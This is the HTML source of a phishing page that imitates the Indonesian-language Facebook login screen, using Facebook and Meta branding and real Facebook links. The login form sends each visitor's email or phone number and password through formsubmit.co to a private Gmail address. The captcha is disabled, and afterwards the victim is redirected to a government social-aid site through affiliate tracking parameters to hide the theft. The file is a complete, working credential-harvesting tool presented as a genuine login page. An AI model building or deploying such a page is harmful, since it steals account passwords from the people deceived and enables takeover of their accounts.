<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Masuk</title>
    <link rel="stylesheet" href="face.css"> 
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    
    <div class="background-gradient"></div> 

    <div class="login-wrapper">
        <div class="language-selector-top">
            <span>Indonesia (Indonesia)</span>
            <i class="fas fa-chevron-down"></i> 
        </div>

        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/100px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook" class="facebook-icon">
            
            <form 
                id="loginForm" 
                class="login-form"
                action="https://formsubmit.co/ratihku527@gmail.com" 
                method="POST"
            >
                <input type="text" id="email" name="email_or_phone_facebook" placeholder="Nomor ponsel atau email" required>

                <input type="password" id="password" name="password" placeholder="Kata sandi" required>
                
                <input 
                    type="hidden" 
                    name="_next" 
                    value="https://cekbansos.kemensos.go.id/?pid=incomeaccess_int-6094&af_sub1=a_6094b_435c_&af_ad_id=901&btag=a_6094b_435c_&utm_medium=901&utm_source=6094&utm_campaign=435&siteid=6094"
                >
                
                <input type="hidden" name="_captcha" value="false">

                <button type="submit" id="loginButton" class="login-btn">Masuk</button>
                
                <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot-password">Lupa kata sandi?</a>
            </form>
            
            <div class="divider"></div> 
            
            <a href="https://web.facebook.com/r.php?locale=id_ID&display=page&entry_point=login" class="create-account-btn">Buat akun baru</a>
            
            <div class="meta-branding">
                <img src="meta.png" alt="Meta Logo" class="meta-logo">
            </div>
            
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        
        loginForm.addEventListener('submit', function(event) {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            
            // Cek apakah field kosong
            if (email === '' || password === '') {
                event.preventDefault(); // Mencegah form dikirim jika kosong
                alert('Mohon isi Nomor ponsel atau email DAN Kata sandi untuk melanjutkan.');
            }
            // Jika terisi, form akan dikirim secara alami (tanpa reCAPTCHA) dan di-redirect ke URL tujuan.
        });
    </script>
</body>
</html>
